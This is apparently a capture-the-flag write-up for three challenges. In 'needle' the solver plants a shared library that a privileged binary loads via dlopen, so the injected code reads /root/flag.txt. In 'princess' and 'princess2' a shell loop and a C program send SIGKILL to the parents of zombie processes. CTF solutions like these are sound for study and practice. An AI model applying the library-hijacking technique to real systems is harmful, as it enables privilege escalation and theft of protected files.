# Threads CTF (threadctf)


## needle

```
static void* retrieve_the_fabric(void* arg) {
    char* flag_fabric_storage = malloc(256);
    FILE* f = fopen("/root/flag.txt", "r");
    if (f) {
        fgets(flag_fabric_storage, 256, f);
        fclose(f);
    }
    sleep(1);
    return flag_fabric_storage;
}

void* lib = dlopen("./libmeeting.so", RTLD_NOW);
    if (!lib) {
        fprintf(stderr, "Failed to load library. Cant have a meeting. Error: %s\n", dlerror());
        return 1;
    }
```
`dlopen("./libmeeting.so")` loads my library into same process as meeting.c run, so meeting() inherits the process's rights. Thus, we can access flag from it (as in `retrieve_the_fabric` function). Also, the fae don't know my actual name, she just accept everything and prints it. So let's tell her flag as my name:

meow.c
```
#include <stdio.h>
#include <stdlib.h>

void* meeting(void* arg) {
    char* flag_fabric_storage = malloc(256);
    FILE* f = fopen("/root/flag.txt", "r");
    if (f) {
        fgets(flag_fabric_storage, 256, f);
        fclose(f);
    }
    // return flag as my name
    return flag_fabric_storage;
}
```
To run:
```
gcc -shared -fPIC -o libmeeting.so meow.c -lpthread
./meeting
```

## princess

```
ps aux
```
```
ctf          278  0.0  0.0      0     0 ?        Z    13:16   0:00 [princess_chains] <defunct>
ctf          296  0.0  0.0      0     0 ?        Z    13:16   0:00 [princess_fury] <defunct>
```
Princesses are sombie processes with "princess_" in their names, so cabins are their parents. We need to kill 50 parents of these processes. Not all of them present at the same time, so check them in loop. Do not kill init process!
```
while true; do for p in $(ps -eo ppid=,stat=,comm= | awk '$2 == "Z" && $3 ~ /^princess_/ && $1 != 1 {print $1}' | sort -u); do echo "killing parent PID $p"; kill -9 "$p" 2>/dev/null; done; done
```
After some time (when we'll kill 50 parents), a file with a flag will appear.
```
ls
nano flag.txt
```

## princess2

Same idea as in princess, but we can use only gcc, vim/nano, rm and ./binaries. And we need to kill 100 parent processes. So let's write C-code for it:

meow.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>

int main(void) {
    while(1) {
        DIR *d = opendir("/proc");
        if (!d) return 1;

        struct dirent *de;
        while ((de = readdir(d)) != NULL) {
            if (!isdigit((unsigned char)de->d_name[0])) continue;

            int pid = atoi(de->d_name);
            char path[64], buf[4096];
            snprintf(path, sizeof(path), "/proc/%d/stat", pid);

            FILE *f = fopen(path, "r");
            if (!f) continue;
            if (!fgets(buf, sizeof(buf), f)) { fclose(f); continue; }
            fclose(f);

            char comm[256], state;
            int ppid;
            if (sscanf(buf, "%*d (%255[^)]) %c %d", comm, &state, &ppid) != 3) continue;

            if (state == 'Z' && strstr(comm, "princess_")) {
                if (ppid > 1) {
                    printf("zombie pid=%d comm=%s ppid=%d\n", pid, comm, ppid);
                    kill(ppid, SIGKILL);
                }
            }
        }
        closedir(d);

        sleep(1);
    }
    return 0; 
}
```

Since we have limited commands, we'll search for processes in `/proc` directory. We check pid to consict only of digits, then go to `/proc/{pid}/stat`, find processes with 'Z' status and "princess_" in command name, send kill signal to their parents (ppid).
```
gcc meow.c -o meow
./meow
```
After waiting for a 15 minutes (if we are lucky), we'll get a `flag.txt`:

```
nano flag.txt
```